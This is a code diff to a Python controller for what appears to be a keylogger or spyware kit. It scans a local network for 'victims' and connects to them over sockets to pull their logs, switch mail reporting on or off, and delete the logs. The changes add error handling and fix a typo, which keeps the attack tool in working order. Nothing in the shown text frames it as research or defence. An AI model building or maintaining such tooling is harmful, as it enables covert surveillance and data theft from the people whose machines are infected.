@@ -52,19 +52,24 @@ def scan_lan(PORT):
 
 def parse_cmd(victims, PORT):
     cmd = input("OYE> ")
-    if len(cmd.split(' ')) > 1:
-        if 0 < len(cmd.split(' ')[0]) < 5:
-            if cmd.split(' ')[0] == 'all':
-                target = 'all'
+    try:
+        if len(cmd.split(' ')) > 1:
+            if 0 < len(cmd.split(' ')[0]) < 5:
+                if cmd.split(' ')[0] == 'all':
+                    target = 'all'
+                else:
+                    target = victims[int(cmd.split(' ')[0])]
+            elif 0 > len(cmd.split(' ')[0]):
+                target = cmd.split(' ')[0]
             else:
-                target = victims[int(cmd.split(' ')[0])]
-        elif 0 > len(cmd.split(' ')[0]):
-            terget = cmd.split(' ')[0]
+                print("[-] Invalid target")
+                parse_cmd(victims, PORT)
         else:
-            print("[-] Invalid target")
-            parse_cmd(victims, PORT)
-    else:
-        target = '0.0.0.0'
+            target = '0.0.0.0'
+    except (IndexError, ValueError):
+        print("[-] Target not on list")
+        print("[!] Try running 'rescan' and try again")
+        parse_cmd(victims, PORT)
 
     if len(cmd.split(' ')) > 1:
         intent = ' '.join(cmd.split(' ')[1:])
@@ -117,6 +122,7 @@ def parse_cmd(victims, PORT):
 
 
 def get_log(target, PORT, intent, victims):
+    try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         print("[*] Connecting to", target+':'+str(PORT))
         s.connect((target, PORT))
@@ -130,33 +136,44 @@ def get_log(target, PORT, intent, victims):
         f.close()
         s.close()
         print("[+] Log received")
+    except ConnectionRefusedError:
+        print("[-] Server went offline")
 
 
 def mail_off(target, PORT, victims, intent):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    print("[*] Connecting to", target+':'+str(PORT))
-    s.connect((target, PORT))
-    print(s.recv(26).decode('utf-8'))
-    s.send(intent.encode())
-    s.close()
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        print("[*] Connecting to", target+':'+str(PORT))
+        s.connect((target, PORT))
+        print(s.recv(26).decode('utf-8'))
+        s.send(intent.encode())
+        s.close()
+    except ConnectionRefusedError:
+        print("[-] Server went offline")
 
 
 def mail_on(target, PORT, victims, intent):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    print("[*] Connecting to", target+':'+str(PORT))
-    s.connect((target, PORT))
-    print(s.recv(26).decode('utf-8'))
-    s.send(intent.encode())
-    s.close()
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        print("[*] Connecting to", target+':'+str(PORT))
+        s.connect((target, PORT))
+        print(s.recv(26).decode('utf-8'))
+        s.send(intent.encode())
+        s.close()
+    except ConnectionRefusedError:
+        print("[-] Server went offline")
 
 
 def rm_log(target, PORT, victims, intent):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    print("[*] Connecting to", target+':'+str(PORT))
-    s.connect((target, PORT))
-    print(s.recv(26).decode('utf-8'))
-    s.send(intent.encode())
-    s.close()
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        print("[*] Connecting to", target+':'+str(PORT))
+        s.connect((target, PORT))
+        print(s.recv(26).decode('utf-8'))
+        s.send(intent.encode())
+        s.close()
+    except ConnectionRefusedError:
+        print("[-] Server went offline")
 
 
 if __name__ == "__main__":
